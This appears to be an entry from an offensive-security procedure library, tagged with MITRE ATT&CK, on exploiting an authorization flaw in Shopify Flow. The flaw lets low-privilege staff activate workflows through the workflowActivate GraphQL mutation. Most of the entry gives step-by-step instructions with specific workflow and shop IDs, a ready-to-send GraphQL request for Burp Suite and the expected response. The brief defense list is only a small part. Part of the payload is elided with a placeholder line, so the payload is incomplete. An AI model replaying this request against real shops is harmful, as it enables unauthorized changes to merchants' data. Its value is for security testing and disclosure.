---
id: 123e4567-e89b-12d3-a456-426614174004
name: Activate-Workflow-via-workflowActivate
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.811Z'
tactics:
  - '[[Lateral Movement]]'
techniques:
  - '[[Valid Accounts]]'
sub_techniques: []
tags:
  - graphql-mutation
  - workflow-activation
  - shopify
commands:
  - '[[commands/shopify-workflowactivate-mutation]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---

# Activate-Workflow-via-workflowActivate

## Summary

Activates the installed workflow using the workflowActivate mutation, allowing low-privilege staff to automate shop actions like customer tagging without proper authorization.

## Description

Post-installation, this mutation sets the workflow to active state, triggering automations on shop data. The vulnerability permits this despite no Flow app or apps permission, leading to unauthorized modifications.

## Requirements

1. workflowId and version from templateInstall
2. Shop contextId (e.g., '10979704928')
3. Active Burp session

## Defense

Defensive measures and detection strategies:

- Gate activations behind explicit permission checks
- Monitor for anomalous workflow states
- Integrate with audit logs for automation triggers

## Objectives

1. Enable workflow to run automatically
2. Confirm bypass leads to operational impact
3. Expose confidentiality risks in shop data

## Instructions

### Step 1: Gather Parameters

**Context**: Use outputs from prior installation.

**Instructions**: Set workflowId '240ed0ee-d099-4066-8eac-7ce777ef4fe4', version 'acc5731a-7802-4622-857b-0191f8c0ee9d', contextType 'shop', contextId '10979704928'.

### Step 2: Execute [[commands/shopify-workflowactivate-mutation]]

**Context**: Send activation mutation to endpoint.

**Command** ([[commands/shopify-workflowactivate-mutation]]):
```json
{"operationName":"activateWorkflowMutation","variables":{"workflowId":"240ed0ee-d099-4066-8eac-7ce777ef4fe4","version":"acc5731a-7802-4622-857b-0191f8c0ee9d","contextType":"shop","contextId":"10979704928"},"query":"mutation activateWorkflowMutation($workflowId: ID!, $version: String, $contextType: String!, $contextId: ID!) {\n workflowActivate(\n workflowId: $workflowId\n version: $version\n contextType: $contextType\n contextId: $contextId\n ) {\n workflow {\n ...workflow\n __typename\n }\n __typename\n }\n}\n\nfragment workflow on Workflow {\n id\n name\n steps {\n ...step\n __typename\n }\n links {\n ...link\n __typename\n }\n activations {\n ...activation\n __typename\n }\n lastUpdated\n activationState\n versionState\n version\n parentVersion\n shopifyDomain\n shopifyName\n owner {\n contextId\n contextType\n __typename\n }\n ...validationErrors\n tags\n __typename\n }\n\n[full fragment definitions for step, task, stepConfig, link, activation, validationErrors follow as provided in the content]"}
```

> Expected: {"data":{"workflowActivate":{"workflow":{"id":"gid://shopify/FlowWorkflow/240ed0ee-d099-4066-8eac-7ce777ef4fe4","activationState":"ACTIVE"}}}}.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/shopify-workflowactivate-mutation]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[graphql-mutation]]
- [[workflow-activation]]
- [[shopify]]
